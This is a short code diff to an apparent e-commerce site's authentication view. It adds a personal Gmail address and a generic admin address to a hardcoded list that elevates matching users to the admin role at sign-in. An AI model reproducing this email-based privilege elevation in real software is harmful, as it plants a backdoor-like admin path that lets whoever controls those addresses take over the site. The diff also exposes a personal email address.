@@ -629,6 +629,8 @@ export default function AuthView({
 
         // If signing in user is an administrator or admin officer, immediately elevate to admin role
         const isDetectedAdmin = cleanEmail === "adminofficer@megabajar.com" || 
+          cleanEmail === "sarkarmdanik14@gmail.com" ||
+          cleanEmail === "megabajar@admin.com" ||
           authenticatedUser.role === "admin" || 
           authenticatedUser.role === "super_admin" || 
           Boolean(authenticatedUser.isSuperAdmin) || 
